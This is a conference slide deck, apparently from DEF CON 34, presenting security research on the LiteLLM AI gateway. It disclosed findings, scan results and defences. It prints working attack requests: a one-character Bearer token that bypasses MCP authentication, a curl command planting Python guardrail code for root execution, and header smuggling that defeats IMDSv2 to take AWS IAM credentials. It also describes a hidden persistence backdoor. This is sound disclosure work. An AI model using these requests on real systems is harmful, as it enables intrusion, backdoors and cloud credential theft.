---
title: "OffGuard Breaking the Most Popular AI Gateway from Auth Bypass to Cloud Compromise"
speakers: ["Yaara Shriki"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: null
source_pdf: "DEF CON 34/DEF CON 34 - Yaara Shriki - OffGuard Breaking the Most Popular AI Gateway from Auth Bypass to Cloud Compromise.pdf"
pages: 49
sha256: "b971088b1dc85501f78fb1eeb3b240702c7260afd19fca0c2351a3c8a07e4c89"
text_chars: 18116
ocr_pages: 0
has_ocr: false
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2"
converted_at: "2026-08-12T00:29:17Z"
---
# OffGuard Breaking the Most Popular AI Gateway from Auth Bypass to Cloud Compromise

**Speakers:** Yaara Shriki  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Yaara Shriki - OffGuard Breaking the Most Popular AI Gateway from Auth Bypass to Cloud Compromise.pdf` (49 pages)

## Slide 1

**DEF CON 34 · BRIEFING**

# **OffGuard**

**Breaking the Most Popular AI Gateway — from Authorization: Bearer a to Cloud Compromise** Yaara Shriki — Threat Researcher, Wiz @Wiz · LiteLLM security research

OffGuard · DEF CON 34 · @Wiz

## Slide 2

**WHOAMI**

# **Yaara Shriki**

Threat researcher **@ Wiz** I break **cloud infrastructure** and **AI systems** for a living Turning ML/NLP into security research tooling — and studying how it's turned against us

**Previously on stage**

Black Hat Europe 2025 — Briefings Black Hat USA 2025 — Arsenal Cloud Village @ DEF CON 33

MSc Computer Science, Tel Aviv University

OffGuard · DEF CON 34 · @Wiz

## Slide 3

#### **We tried to break the most popular AI gateway. It broke at every layer.**

- 3 independent paths from zero to cloud root —

plus a backdoor that survives its own deletion.

OffGuard · DEF CON 34 · @Wiz

## Slide 4

##### **Agenda**

1. **What's an AI gateway** — and why it's a crown jewel

   5. **Ghost guardrails** — persistence that survives deletion

2. **The master key problem** — `sk-1234` in the wild

3. **MCP auth bypass** — `Authorization: Bearer a`

4. **Root RCE** — guardrail sandbox escape

6. **SSRF → cloud** — defeating IMDSv2

7. **Internet-scale validation** — we scanned the world

8. **Defenses** — and what this means for AI infra

**3**

**3**

**>3,000**

independent compromise paths

live demos

real instances tested

OffGuard · DEF CON 34 · @Wiz

4 / 49

## Slide 5

###### **PART 1**

### **What's an AI gateway?**

**And why should you care**

OffGuard · DEF CON 34 · @Wiz

## Slide 6

##### **LiteLLM is everywhere**

33k+ ~1 / 3 5+
GitHub stars of cloud environments providers fronted
(Wiz telemetry) OpenAI · Anthropic · Bedrock · Vertex ·
Azure

When an org wants to use multiple LLM providers, they put **one proxy in front of everything** . That proxy is usually LiteLLM.

OffGuard · DEF CON 34 · @Wiz

6 / 49

## Slide 7

##### **What that one proxy holds**

- 🔑 **API keys** for **every** configured LLM provider

   - 🔌 **MCP connections** — databases, GitHub, Slack, internal APIs

- 💬 **Every prompt & response** flowing through the org

- ☁ The **IAM role** of the cloud instance it runs on

Compromising the AI gateway doesn't just mean compromising AI. It means access to **everything the gateway touches** .

OffGuard · DEF CON 34 · @Wiz

7 / 49

## Slide 8

##### **The architecture**

🤖  OpenAI · Anthropic
👥  Users ⚙  LiteLLM
☁  Bedrock · Vertex · Azure
→ →
apps · agents master key · guardrails ·
· CI pass-through
🔌  MCP servers (DB, GitHub,
Slack…)
☁  IAM role  →  169.254.169.254
Runs on an EC2 / pod with an
Every red box becomes an exit in this talk.

OffGuard · DEF CON 34 · @Wiz

8 / 49

## Slide 9

**PART 2**

### **The master key problem**

**Many deployments are compromised before we write a single exploit**

OffGuard · DEF CON 34 · @Wiz

## Slide 10

##### **One key to rule them all**

LiteLLM uses a single **master key** that controls **three** independent things:

🔐 🖥 ✍ API authentication Admin UI login JWT signing (it **is** the HS256 secret)

Know the master key → you can **forge any session JWT** for any user. No bug required.

OffGuard · DEF CON 34 · @Wiz

10 / 49

## Slide 11

##### **The documentation default:** **`sk-1234`**

Quickstart guides. Docker Compose files. Tutorials. Blog posts. They all ship with:

**The "example" key works on a disturbing number of production deployments.** Real keys. Real traffic. Real bills.

```
environment:
LITELLM_MASTER_KEY:"sk-1234"
LITELLM_SALT_KEY:"sk-1234"
```

People copy-paste to prod and never change it.

OffGuard · DEF CON 34 · @Wiz

11 / 49

## Slide 12

##### **What default creds give you — no exploits needed**

**Every LLM provider API key** in the system

**LLMjacking** — use their model access, **they** pay the bill

**Full admin UI** access Forge **any session JWT** (you hold the signing key)

The launch pad for **every other bug** in this talk

Before we even reach a vulnerability, ~1 in 10 internet-facing instances is already wide open.

OffGuard · DEF CON 34 · @Wiz

12 / 49

## Slide 13

###### **PART 3 · NO CREDENTIALS REQUIRED**

### **`Authorization: Bearer a`**

###### **The MCP authentication bypass**

OffGuard · DEF CON 34 · @Wiz

## Slide 14

##### **First, MCP in 30 seconds**

**Model Context Protocol** — the emerging standard for connecting AI to external tools. Think " **plugins for LLMs** ": databases, GitHub, Slack, Jira, internal APIs. 🤖 **LLM / agent** → ⚙ **LiteLLM MCP endpoint** → 🛠 **Tools → DB · GitHub · Slack**

**LiteLLM supports MCP — and enables it by default.** `GET /mcp/enabled → {"enabled": true}`

OffGuard · DEF CON 34 · @Wiz

14 / 49

## Slide 15

##### **The design: dual authentication**

The MCP endpoint accepts **two** auth methods:

**1. LiteLLM API keys** normal proxy auth

**2. OAuth2 token passthrough** forward a user's token to a downstream MCP server (Atlassian, GitHub…)

The handler has to decide: is this Bearer token a **LiteLLM key** , or an **OAuth2 passthrough token** ?

It decides… badly.

OffGuard · DEF CON 34 · @Wiz

15 / 49

## Slide 16

##### **The flaw: failure becomes success**

```
# user_api_key_auth_mcp.py  — the OAuth2 passthrough branch
elif oauth2_headers:
try:
       validated = await user_api_key_auth(api_key=litellm_api_key,
                                           request=request)
except HTTPException as e:
if e.status_code in (401, 403):
           validated = UserAPIKeyAuth()   # ← BYPASS: empty but "authenticated"
else:
raise
```

Key validation **fails** → handler catches the 401 → returns an empty `UserAPIKeyAuth()` **instead of rejecting** .

And `oauth2_headers` is populated for **any** request with an Authorization header — so the bypass path is **always reachable** .

OffGuard · DEF CON 34 · @Wiz

16 / 49

## Slide 17

##### **Result: a one-character session**

`POST /mcp/ HTTP/1.1 Host: target:4000 Authorization: Bearer a {"jsonrpc":"2.0","method":"initialize","id":1, ... } → HTTP 200` **Token Result** `→ mcp-session-id: <valid> Bearer a` **200 — session** A fully authenticated MCP session from `Bearer` (empty) **200 — session garbage** . **no header** 500 (other path) **No master key. No valid token. No knowledge of the target.**

OffGuard · DEF CON 34 · @Wiz

17 / 49

## Slide 18

##### **Then you get the tools**

Once you hold a session:

```
POST /mcp/    Authorization: Bearer a    Mcp-Session-Id: <id>
{"jsonrpc":"2.0","method":"tools/list","id":2}
```

**Enumerate** every connected MCP tool **Execute** any tool with arbitrary arguments Reach whatever they wired up: DBs, GitHub, Slack, file systems, internal APIs

**The** **`allow_all_keys` flag** LiteLLM docs recommend it for "internal knowledge bases, calendar integrations, low-risk utilities." When set, **every** tool is available to **every** authenticated user — including our empty credential.

OffGuard · DEF CON 34 · @Wiz

18 / 49

## Slide 19

**D E M O 1**

## **`Bearer a` → tools**

enumerate connected MCP tools → execute them → touch real resources all from a single junk token

OffGuard · DEF CON 34 · @Wiz

## Slide 20

**PART 4 · WITH (DEFAULT) CREDENTIALS**

### **Root RCE**

**Guardrail sandbox escape**

OffGuard · DEF CON 34 · @Wiz

## Slide 21

##### **The feature: Custom Code Guardrails**

Admins can write **Python that runs server-side on every LLM request** — rate limiting, content filtering, logging, whatever you want.

→ → **LLM request** 🐍 **your Python (** **`apply_guardrail()` )** It runs in a "sandbox" that's **supposed** to be safe: Scans source for **forbidden patterns** ( `import` , builtins access) Removes **`builtins`** before `exec`

OffGuard · DEF CON 34 · @Wiz

21 / 49

## Slide 22

##### **The flaw: the sandbox guards the wrong door**

**`POST /guardrails/test`** the **test** endpoint

forbidden-pattern check **`builtins`** stripped

**`POST /guardrails`** the **production** endpoint

no pattern check full **`builtins`**

```
# production path — guardrail_hooks/custom_code/custom_code_guardrail.py
exec(compile(code, "<string>", "exec"))     # no sandbox. at all.
```

**And the default Docker image runs as root.**

OffGuard · DEF CON 34 · @Wiz

22 / 49

## Slide 23

##### **Single POST →** **`uid=0(root)`**

```
curl -X POST http://target:4000/guardrails \
 -H "Authorization: Bearer sk-1234" -d '{ "guardrail": {
    "guardrail_name":"rce","litellm_params":{
      "guardrail":"custom_code","mode":"pre_call","default_on":true,
      "custom_code":"import os\n_o=os.popen('"'"'id'"'"').read()\n..." }}}'
```

Trigger any chat completion →

```
RCE_OUTPUT: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon)...
```

When `LITELLM_MASTER_KEY` is unset, every user is auto-granted `PROXY_ADMIN` → **unauthenticated** RCE.

OffGuard · DEF CON 34 · @Wiz

23 / 49

## Slide 24

##### **What root in the container buys you**

`"env": {` **Root shell** in the container `"DATABASE_URL": "postgresql://llmproxy:db password9090@litellm_db:5432/...",` **Every provider API key** (env) `"LITELLM_MASTER_KEY": "sk-1234", "LITELLM_SALT_KEY":   "sk-1234",` **DB credentials** in plaintext `"UI_PASSWORD": "langchain", "OPENAI_API_KEY": "...", "AWS_...": "..."` Mounted **K8s service-account tokens** `}` **Network access** to internal services A pivot point into the whole environment

Real dump from a test instance — master key, salt key, UI password, all in environment variables.

OffGuard · DEF CON 34 · @Wiz

24 / 49

## Slide 25

**PART 5 · THE FINDING THAT SURPRISED US MOST**

### **Ghost guardrails**

**A backdoor that survives its own deletion**

OffGuard · DEF CON 34 · @Wiz

## Slide 26

##### **Delete ≠ delete**

When you delete a guardrail, LiteLLM:

- 1 — Removes the record from the database ✓

- 2 — Returns `success` ✓

- 3 — Does **NOT** remove it from the in-memory callback list ✗

The deleted guardrail's code keeps executing on **every** LLM request — until the process restarts.

OffGuard · DEF CON 34 · @Wiz

26 / 49

## Slide 27

##### **The attacker workflow**

3 ·
2 · create 4 · evidence 5 · code
1 · get admin delete
guardrail gone still runs
default/stolen → → it → →
DB · UI · API
your every
creds via the
backdoor empty request
API

```
GET /guardrails/list  →  {"guardrails": []}      # the UI agrees: nothing here
... meanwhile the deleted code intercepts every request, including pass-through
```

**Plant → delete → persist.** The deletion **is** the stealth step.

OffGuard · DEF CON 34 · @Wiz

27 / 49

## Slide 28

##### **Why incident response won't find it**

❌ Rotate credentials → backdoor still runs ❌ Review admin configs → nothing in the database

- ❌ Check audit logs → guardrail was "deleted"

- ❌ Examine running config → API returns empty

**2** things that actually remove it

🧠 runtime memory inspection (who does that?)

🔄 full process restart

OffGuard · DEF CON 34 · @Wiz

28 / 49

## Slide 29

##### **What you'd actually plant**

**Exfiltrate** every prompt & response to your server

**Cryptominer** — you have root in the container

**Inject** content into LLM responses **Harvest credentials** from requests

Silent, **logless** , survives audits and rotation

No database row. No config file. No log entry. Just code running in memory on every request that passes through your gateway.

OffGuard · DEF CON 34 · @Wiz

29 / 49

## Slide 30

###### **D E M O 2**

## **Root → ghost**

single POST → root shell → plant guardrail → delete it → show it's gone from every interface, show it still runs on every request

OffGuard · DEF CON 34 · @Wiz

## Slide 31

**PART 6 · FROM APP TO CLOUD**

### **SSRF → cloud compromise**

**Defeating IMDSv2**

OffGuard · DEF CON 34 · @Wiz

## Slide 32

##### **The feature: pass-through endpoints**

LiteLLM lets admins create **proxy routes to arbitrary URLs** — intended for custom backends.

`POST /config/pass_through_endpoint     Authorization: Bearer sk-1234 {"path":"/imds","target":"http://169.254.169.254/latest/","include_subpath":true}` No validation against:

**private IP ranges localhost 169.254.169.254 (cloud metadata)**

**IMDSv1 is instant:** proxy to `/meta-data/iam/security-credentials/` → IAM keys. Done.

OffGuard · DEF CON 34 · @Wiz

32 / 49

## Slide 33

##### **IMDSv2 is supposed to stop exactly this**

AWS IMDSv2 requires a **two-step, header-bound** handshake — designed to defeat SSRF:

**1 ·** **`PUT /latest/api/token` 2 · send token in** → → **credentials get a session token** **`X-aws-ec2-metadata-token` header** A naive SSRF can't set custom request headers on the forwarded call. **So how do we inject** **`X-aws-ec2-metadata-token` ?**

OffGuard · DEF CON 34 · @Wiz

33 / 49

## Slide 34

##### **The bypass: header prefix-stripping**

LiteLLM's pass-through **strips a configured prefix** before forwarding headers. So we smuggle the metadata header **behind** the prefix:

```
PUT/imds-tokenHTTP/1.1
x-pass-X-aws-ec2-metadata-token-ttl-seconds: 21600
       └────────── LiteLLM strips "x-pass-" ──────────┘
  forwarded to169.254.169.254  →  X-aws-ec2-metadata-token-ttl-seconds: 21600
```

The attacker now controls an **arbitrary forwarded header** → can complete the IMDSv2 handshake. **IMDSv2 defeated through application-layer header manipulation.**

OffGuard · DEF CON 34 · @Wiz

34 / 49

## Slide 35

##### **Full chain → real IAM credentials**

```
PUT  /imds-token
```

```
 x-pass-X-aws-ec2-metadata-token-ttl-seconds: 21600
→ AQAAAC...  (v2 token, 56 chars)
GET  /imds/meta-data/iam/security-
      credentials/litellm_default_creds-Role
 x-pass-X-aws-ec2-metadata-token: <token>
→ AccessKeyId / SecretAccessKey / Token
```

```
$ aws sts get-caller-identity
{
"Account": "831926616802",
"Arn": "arn:aws:sts::8319...:assumed-role/
  litellm_default_creds-Role/i-0b731..."
}
```

**Valid, live AWS credentials.** Verified against a real test instance.

OffGuard · DEF CON 34 · @Wiz

35 / 49

## Slide 36

##### **Blast radius**

LiteLLM's IAM role typically carries:

🤖 🔐
Bedrock · Vertex Secrets Manager
(LLM access) (more credentials)

🪣
S3
(data)

➕
whatever else the
deployment needed

We started at an exposed proxy. We're now moving laterally through the cloud account with valid IAM credentials.

OffGuard · DEF CON 34 · @Wiz

36 / 49

## Slide 37

###### **D E M O 3**

**Pass-through → IAM** create pass-through to 169.254.169.254 → defeat IMDSv2 via `x-pass-` → extract IAM credentials → `aws sts get-caller-identity`

OffGuard · DEF CON 34 · @Wiz

## Slide 38

**PART 7**

### **Internet-scale validation**

**We scanned the world**

OffGuard · DEF CON 34 · @Wiz

## Slide 39

##### **Methodology**

###### **Discovery**

Shodan fingerprinting for LiteLLM >3,000 internet-facing instances

**Tested (non-destructively)** Authentication required? Default key `sk-1234` accepted? MCP `Bearer a` bypass reachable?

Ethics: enumeration and auth checks only — no data exfiltration, no tool execution against third parties. Findings disclosed upstream.

OffGuard · DEF CON 34 · @Wiz

39 / 49

## Slide 40

##### **Results: ~1 in 10 wide open**

**191**

**103**

**330**

no auth at all default key MCP `Bearer` (6.2%) `sk-1234 a` bypass (3.4%) confirmed

**These aren't test boxes** — real API keys, real traffic. Two instances exposed **25 MCP tools** with zero auth.

OffGuard · DEF CON 34 · @Wiz

40 / 49

## Slide 41

##### **And the internet is the easy case**

Internal deployments are very likely **worse** :

🔌 🔓 ☁ richer internal MCP resources looser "it's behind the VPN" broader IAM permissions (prod DBs, source, ticketing) security assumptions

What we measured externally is the floor, not the ceiling.

OffGuard · DEF CON 34 · @Wiz

41 / 49

## Slide 42

###### **PART 8**

### **Defenses**

**And what this means for AI infrastructure**

OffGuard · DEF CON 34 · @Wiz

## Slide 43

##### **Every layer has a gap**

> **No credentials** →<sup>MCP auth bypass✗</sup>

> **Default credentials** →<sup>Root RCE + ghost persistence✗</sup>

> **Valid credentials** →<sup>SSRF→cloud compromise✗</sup>

Whatever your attacker's starting position, there's a path forward.

OffGuard · DEF CON 34 · @Wiz

43 / 49

## Slide 44

##### **Detection**

**Guardrail creation** — alert on anomalous / code-bearing guardrails **Unexpected MCP sessions** — esp. tool enumeration from odd tokens

**Pass-through endpoints** targeting **internal / metadata IPs Ghost guardrails** — diff in-memory callback list vs database state

The ghost guardrail is the hard one: **your config-as-source-of-truth lies** . Detection has to inspect **runtime memory** , not stored config.

OffGuard · DEF CON 34 · @Wiz

44 / 49

## Slide 45

##### **Architectural recommendations**

**Disable MCP** if you don't use it (it's on by default)

**Separate** UI creds from API creds; **rotate** **`sk-1234`** yesterday

**Block egress** to `169.254.169.254` and private ranges

Treat the gateway as **internet-facing** , even internally

**IRSA / workload identity** with **minimal** IAM permissions

**Actually restart your services** occasionally

Put the AI gateway inside your existing security program — it's infrastructure, not a science experiment.

OffGuard · DEF CON 34 · @Wiz

45 / 49

## Slide 46

##### **Disclosure status**

|**Finding**|**Status**|**Reference**|
|---|---|---|
|Guardrail Sandbox Es|cape (RCE)
**Patched**|PR #22095 · GHSA-7488-6r32-c95q|
|MCP Authentication B|ypass
**Disclosed, under review**|GHSA-72m8-9m7m-h278|
|Ghost Guardrail Persis|tence
**Patched**|—|
|SSRF via Pass-Throug|h
**Dangerous-by-design**|reported; intended functionality|

All findings responsibly disclosed to the LiteLLM maintainers. Thanks to the BerriAI team for engaging.

OffGuard · DEF CON 34 · @Wiz

46 / 49

## Slide 47

##### **The bigger picture**

AI gateways are becoming **critical infrastructure** — but they're deployed by **ML teams, not security teams** .

They fall **outside** existing security processes One proxy concentrates **keys + data + tools + IAM**

LiteLLM is the case study. **The pattern repeats across the entire AI infrastructure category.**

The gap between "ML thinks it's secure" and "what an attacker can do" is **large**

OffGuard · DEF CON 34 · @Wiz

47 / 49

## Slide 48

##### **Takeaways**

1 — One proxy holds your keys, prompts, tools, and cloud role. **Treat it as a crown jewel.**

- 2 — Three independent paths, **zero → cloud root** : MCP bypass · root RCE · SSRF.

- 3 — **Ghost guardrails** : deleted code that keeps running. Config is not reality.

- 4 — AI infra needs the **same security rigor** as everything else. This pattern will repeat.

OffGuard · DEF CON 34 · @Wiz

48 / 49

## Slide 49

# **Thank you**

###### **Questions?**

**Yaara Shriki** — Threat Researcher, Wiz LiteLLM security research · OffGuard

**MCP: GHSA-72m8-9m7m-h278 RCE: GHSA-7488-6r32-c95q**

OffGuard · DEF CON 34 · @Wiz
